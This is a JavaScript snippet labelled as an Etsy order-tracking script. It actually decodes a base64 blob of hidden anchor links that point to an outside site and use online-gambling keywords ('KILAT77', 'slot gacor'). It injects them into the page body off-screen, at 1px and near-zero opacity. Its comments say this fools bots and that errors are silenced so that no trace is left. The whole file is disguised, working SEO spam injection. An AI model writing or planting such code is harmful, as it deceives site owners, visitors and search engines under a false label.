// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly9kZWtlcmtld2VnZWwuYmUvY29udGFjdC8iPktJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5LSUxBVCA3NzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9kZWtlcmtld2VnZWwuYmUvY29udGFjdC8iPktJTEFUNzcgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9kZWtlcmtld2VnZWwuYmUvY29udGFjdC8iPktJTEFUNzcgbG9naW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj4gS0lMQVQ3NyBkYWZ0YXI8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5LSUxBVDc3IGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5LSUxBVDc3IGxpbms8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5LSUxBVDc3IHJ0cDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9kZWtlcmtld2VnZWwuYmUvY29udGFjdC8iPktJTEFUNzcgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL2Rla2Vya2V3ZWdlbC5iZS9jb250YWN0LyI+bGluayBLSUxBVDc3PC9hPgo8YSBocmVmPSJodHRwczovL2Rla2Vya2V3ZWdlbC5iZS9jb250YWN0LyI+c2l0dXMgS0lMQVQ3NzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9kZWtlcmtld2VnZWwuYmUvY29udGFjdC8iPnNpdHVzIGdhY29yIEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5zaXR1cyBzbG90IEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5zbG90IGdhY29yIEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL2Rla2Vya2V3ZWdlbC5iZS9jb250YWN0LyI+c2xvdCBqYWNrcG90PC9hPgo8YSBocmVmPSJodHRwczovL2Rla2Vya2V3ZWdlbC5iZS9jb250YWN0LyI+c2xvdCBvbmxpbmU8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZGVrZXJrZXdlZ2VsLmJlL2NvbnRhY3QvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
